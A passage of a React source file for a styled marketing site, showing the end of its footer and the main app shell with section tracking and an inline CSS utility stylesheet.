        </div>
        <div className="font-mono t-10 text-white/40">
          © AI Infinity Group LLC  ·  IP: Andre Thompson Sr.  ·  <InfinityCheck className="t-verb" />
        </div>
      </div>

    </div>
  </footer>
);

// ───────────────────────── App shell ─────────────────────────
export default function InfinityDragonSite() {
  const [active, setActive] = useState("manifesto");

  useEffect(() => {
    const ids = ["manifesto","aca","console","architecture","certification","threat-surface"];
    const obs = new IntersectionObserver(
      (entries) => {
        entries.forEach(e => {
          if (e.isIntersecting) setActive(e.target.id);
        });
      },
      { rootMargin: "-40% 0px -55% 0px" }
    );
    ids.forEach(id => {
      const el = document.getElementById(id);
      if (el) obs.observe(el);
    });
    return () => obs.disconnect();
  }, []);

  return (
    <div className="min-h-screen text-white antialiased">
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght,SOFT@9..144,300..900,0..100&family=Newsreader:ital,wght@0,300..700;1,300..700&family=JetBrains+Mono:wght@300;400;500;600&display=swap');

        :root {
          --ink: #0a0908;
          --ink-2: #131210;
          --ink-3: #1c1a17;
          --parchment: #f4ede0;
          --gold: #c9a44c;
          --gold-bright: #e6c477;
          --gold-deep: #8c6f2e;
          --verified: #3d7c5a;
          --verified-bright: #6fc090;
          --halt: #8b2a2a;
          --halt-bright: #d97a7a;
          --mute: #6b6359;
        }

        html { scroll-behavior: smooth; }
        body { background: var(--ink); }

        /* font utilities */
        .font-display { font-family: 'Fraunces', serif; font-variation-settings: "SOFT" 30; letter-spacing: -0.02em; }
        .font-body    { font-family: 'Newsreader', serif; }
        .font-mono    { font-family: 'JetBrains Mono', ui-monospace, monospace; }

        /* backgrounds */
        .bg-ink     { background: var(--ink); }
        .bg-ink-85  { background: rgba(10,9,8,0.85); }
        .bg-ink2    { background: var(--ink-2); }
        .bg-ink3    { background: var(--ink-3); }
        .bg-gold    { background: var(--gold); }
        .bg-gold-5  { background: rgba(201,164,76,0.05); }
        .bg-gold-10 { background: rgba(201,164,76,0.10); }
        .bg-gold-60 { background: rgba(201,164,76,0.60); }
        .bg-goldb   { background: var(--gold-bright); }
        .bg-goldb-40{ background: rgba(230,196,119,0.40); }
        .bg-ver-5   { background: rgba(61,124,90,0.05); }
        .bg-ver-10  { background: rgba(61,124,90,0.10); }
        .bg-verb    { background: var(--verified-bright); }
        .bg-halt-5  { background: rgba(139,42,42,0.05); }
        .bg-halt-10 { background: rgba(139,42,42,0.10); }
        .bg-iasa-grad { background: linear-gradient(135deg, rgba(201,164,76,0.04), transparent 70%); }

        /* borders */
        .bd-gold-25 { border-color: rgba(201,164,76,0.25); }
        .bd-gold-30 { border-color: rgba(201,164,76,0.30); }
        .bd-gold-40 { border-color: rgba(201,164,76,0.40); }
        .bd-gold-60 { border-color: rgba(201,164,76,0.60); }
        .bd-gold-70 { border-color: rgba(201,164,76,0.70); }
        .bd-ver-40  { border-color: rgba(61,124,90,0.40); }
        .bd-ver-50  { border-color: rgba(61,124,90,0.50); }
        .bd-halt-50 { border-color: rgba(139,42,42,0.50); }

        /* text colors */
        .t-ink       { color: var(--ink); }
        .t-gold      { color: var(--gold); }
        .t-gold-40   { color: rgba(201,164,76,0.40); }
        .t-gold-70   { color: rgba(201,164,76,0.70); }
        .t-gold-80   { color: rgba(201,164,76,0.80); }
        .t-goldb     { color: var(--gold-bright); }
        .t-verb      { color: var(--verified-bright); }
        .t-haltb     { color: var(--halt-bright); }
        .t-haltb-80  { color: rgba(217,122,122,0.80); }

        /* gradients */
        .gold-arrow { background: linear-gradient(to right, rgba(201,164,76,0.60), transparent); }

        /* hover / focus / group-hover variants — escaping the colon for Tailwind-like syntax */
        .hover\\:bg-goldb:hover    { background: var(--gold-bright); }
        .hover\\:bg-ink2:hover     { background: var(--ink-2); }
        .hover\\:bd-gold-40:hover  { border-color: rgba(201,164,76,0.40); }
        .hover\\:bd-gold-60:hover  { border-color: rgba(201,164,76,0.60); }
        .hover\\:t-goldb:hover     { color: var(--gold-bright); }
        .focus\\:bd-gold-60:focus  { border-color: rgba(201,164,76,0.60); outline: none; }
        .group:hover .group-hover\\:bg-goldb { background: var(--gold-bright); }
        .group:hover .group-hover\\:t-goldb  { color: var(--gold-bright); }

        /* text sizes (arbitrary px) */
        .t-9  { font-size: 9px; }
        .t-10 { font-size: 10px; }
        .t-11 { font-size: 11px; }
        .t-12 { font-size: 12px; }
        .t-13 { font-size: 13px; }
        .t-14 { font-size: 14px; }
        .t-15 { font-size: 15px; }
        .t-hero  { font-size: clamp(2.6rem, 7.2vw, 6.4rem); }
        .t-h2    { font-size: clamp(2rem, 5vw, 3.6rem); }
        .t-quote { font-size: clamp(1.3rem, 2.2vw, 1.85rem); }

        /* tracking (letter-spacing) */
        .tk-18 { letter-spacing: 0.18em; }
        .tk-20 { letter-spacing: 0.20em; }
        .tk-24 { letter-spacing: 0.24em; }
        .tk-28 { letter-spacing: 0.28em; }
        .tk-30 { letter-spacing: 0.30em; }
        .tk-32 { letter-spacing: 0.32em; }

        /* line-height */
        .lh-95  { line-height: 0.95; }
        .lh-100 { line-height: 1; }
        .lh-135 { line-height: 1.35; }

        /* atmospherics */
        .grain {
          background-image:
            radial-gradient(1200px 600px at 80% -10%, rgba(201,164,76,0.08), transparent 60%),
            radial-gradient(800px 500px at 0% 30%, rgba(61,124,90,0.06), transparent 60%),
            radial-gradient(900px 600px at 50% 100%, rgba(201,164,76,0.05), transparent 70%);
        }
        .grid-lines {
          background-image:
            linear-gradient(to right, rgba(255,255,255,0.025) 1px, transparent 1px),
            linear-gradient(to bottom, rgba(255,255,255,0.025) 1px, transparent 1px);
          background-size: 80px 80px;
        }

        .reveal { opacity: 0; transform: translateY(12px); animation: reveal 0.9s cubic-bezier(.2,.7,.2,1) forwards; }
        @keyframes reveal { to { opacity: 1; transform: translateY(0); } }

        .pulse-dot { animation: pulse 2.4s ease-in-out infinite; }
        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.35; } }

        .scan { animation: scan 1.6s linear infinite; }
        @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
      `}</style>

      <div className="fixed inset-0 -z-10 grain" />
      <div className="fixed inset-0 -z-10 grid-lines opacity-40" />

      <TelemetryBar active={active} />

      <main className="font-body">
        <Manifesto />
        <ACADecisionLayer />
        <ACAConsole />
        <Architecture />
        <Certification />
        <ThreatSurface />
      </main>

      <Footer />
    </div>
  );
}
